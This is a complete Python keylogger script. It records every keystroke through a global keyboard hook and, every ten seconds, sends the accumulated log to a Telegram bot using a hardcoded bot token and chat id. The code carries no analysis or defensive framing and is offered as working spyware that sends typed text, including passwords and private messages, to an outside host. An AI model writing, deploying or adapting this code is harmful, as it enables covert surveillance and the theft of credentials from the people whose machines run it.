import keyboard
import requests
import threading
import time

SEND_REPORT_EVERY = 10

class keylogger():
	def __init__(self,interval):
		self.interval  = interval
		self.log = ""
		
	def call_back(self,event):
		name = event.name
		if len(name) > 1:
			if name == "enter":
				name = "[Enter]\n"
			if name == "space":
				name = " "
			if name == "decimal":
				name = "."
			else:
				name = name.replace(" ", "_")
				name = f"[{name.upper()}]"
		self.log = self.log+name
		
	def tele_bot(self):
		TOKEN = "5708352930:AAGITpBmn0UDOIPjtwaOUX-1CSJ_cgOyVG0"
		chat_id = "5661999583"
		message = self.log
		url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chat_id}&text={message}"
		requests.get(url)
	
	def report(self):
		self.tele_bot()
		self.log = ""
		timer = threading.Timer(interval=self.interval, function=self.report)
		timer.daemon = True
		timer.start()
		
	def start(self):
		keyboard.on_release(callback = self.call_back)
		self.report()
		keyboard.wait()

if __name__=="__main__":
	keylogger = keylogger(interval = SEND_REPORT_EVERY)
	keylogger.start()











